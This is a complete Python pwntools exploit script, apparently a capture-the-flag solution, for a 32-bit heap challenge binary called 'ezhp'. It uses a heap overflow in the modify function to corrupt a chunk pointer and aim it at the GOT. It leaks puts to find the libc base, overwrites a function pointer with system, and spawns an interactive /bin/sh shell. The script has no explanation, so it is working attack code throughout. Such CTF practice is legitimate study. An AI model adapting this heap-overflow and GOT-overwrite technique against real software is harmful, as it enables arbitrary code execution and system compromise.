#!/usr/bin/env python
from pwn import *

def add(size):
    s.sendlineafter('option.\n','1')
    s.sendlineafter('size.\n',str(size))

def remove(_id):
    s.sendlineafter('option.\n','2')
    s.sendlineafter('id.\n',str(_id))

def modify(_id,data):
    s.sendlineafter('option.\n','3')
    s.sendlineafter('id.\n',str(_id))
    s.sendlineafter('size.\n',str(len(data)))
    s.sendlineafter('data.\n',data)

def show(_id):
    s.sendlineafter('option.\n','4')
    s.sendlineafter('id.\n',str(_id))

if __name__ == '__main__':
    s = process('./ezhp')
    elf = ELF('./ezhp')
    libc = ELF('/lib32/libc.so.6')

    add(1)
    add(1)
    add(1)
    add(1)
    add(1)
    modify(0,'A' * 0xc + p32(1) + p32(0x804a064))
    add(1)
    modify(5,p32(elf.got['puts']))
    show(4)
    libc_base = u32(s.recvline(False)[:4]) - libc.symbols['puts']
    log.info('libc base: %#x' % libc_base)
    modify(0,'/bin/sh\0')
    modify(4,p32(libc_base + libc.symbols['system']))
    s.sendline('4')
    s.sendline('0')
    s.interactive()
